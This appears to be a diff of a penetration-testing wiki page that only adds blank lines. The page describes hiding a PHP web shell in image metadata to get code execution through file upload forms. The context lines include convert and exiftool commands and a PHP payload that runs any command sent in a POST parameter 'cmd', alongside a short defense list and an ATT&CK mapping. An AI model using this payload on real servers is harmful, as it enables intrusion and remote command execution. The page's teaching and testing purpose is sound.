@@ -35,6 +35,8 @@ A common method of uploading images to a website is through a form that allows u
 
 A common method of uploading images to a website is through a form that allows users to upload files. Attackers can exploit this functionality by uploading an image file with custom metadata that contains PHP code. This code can then be executed on the server when the image is processed. The attacker can then gain access to the server and perform further malicious actions. This technique can be used as an initial access vector for an attacker.
 
+ 
+
 ## Requirements
 
 1. Access to the target website's file upload functionality
@@ -42,6 +44,8 @@ A common method of uploading images to a website is through a form that allows u
 1. Ability to upload files
 
 1. Knowledge of PHP code
+
+ 
 
 ## Defense
 
@@ -51,6 +55,8 @@ A common method of uploading images to a website is through a form that allows u
 
 1. Regularly monitor server logs for suspicious activity
 
+ 
+
 ## Objectives
 
 1. Upload an image with custom metadata containing PHP code
@@ -58,6 +64,8 @@ A common method of uploading images to a website is through a form that allows u
 1. Execute the PHP code on the server
 
 1. Gain access to the server
+
+ 
 
 # Instructions
 
@@ -70,7 +78,13 @@ exiftool -EXIF:Tag=Value picture_name.jpg
 5. Hit enter to execute the command.
 6. The exif tag in the picture will be customized with the specified value.
 
+ 
+
+
+
 **Code**: [[exiftool]]
+
+
 
 > Exiftool is a command-line tool used to read, write and edit metadata in image, audio and video files. With exiftool, you can customize exif tags in a picture by specifying the name of the tag and the value you want to set for that tag. This can be useful for adding copyright information, author details, and other metadata to your pictures.
 
@@ -79,8 +93,15 @@ exiftool -EXIF:Tag=Value picture_name.jpg
 2. Use the `exiftool` command to add metadata to the `payload.jpg` file. Set the `Copyright` field to `PayloadsAllTheThings`, the `Artist` field to `Pentest`, and the `ImageUniqueID` field to `Example`.
 3. Use the `exiftool` command again to add a PHP code as a comment to the `img.jpg` file. The PHP code will execute any command passed as a POST parameter named `cmd`.
 
+
+ 
+
+
+
 **Code**: [[convert -size 110x110 xc:white payload.jpg
 exiftoo]]
+
+
 
 > The `convert` command is a part of ImageMagick software suite that is used to create, edit, and compose bitmap images. In this case, we use it to create a blank white image with a size of 110x110 pixels that will be used as a container for our payload.
 
@@ -88,11 +109,17 @@ The `exiftool` command is a powerful tool for reading, writing, and editing meta
 
 Finally, we use the `exiftool` command again to add a PHP code as a comment to the `img.jpg` file. The PHP code will execute any command passed as a POST parameter named `cmd`. This allows us to execute arbitrary commands on the server by simply sending a POST request to the `img.jpg` file with the `cmd` parameter set to the desired command.
 
+
+
 **Command** ([[Create white image with specified size]]):
 
 ```bash
 convert -size 110x110 xc:white payload.jpg
 ```
+
+
+
+
 
 **Command** ([[Add metadata to image]]):
 
@@ -100,11 +127,17 @@ convert -size 110x110 xc:white payload.jpg
 exiftool -Copyright="PayloadsAllTheThings" -Artist="Pentest" -ImageUniqueID="Example" payload.jpg
 ```
 
+
+
+
+
 **Command** ([[Insert PHP code into image metadata]]):
 
 ```bash
 exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -130,3 +163,5 @@ exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __h
 - [[Exploits]]
 - [[Picture with custom metadata]]
 - [[Upload Insecure Files]]
+
+
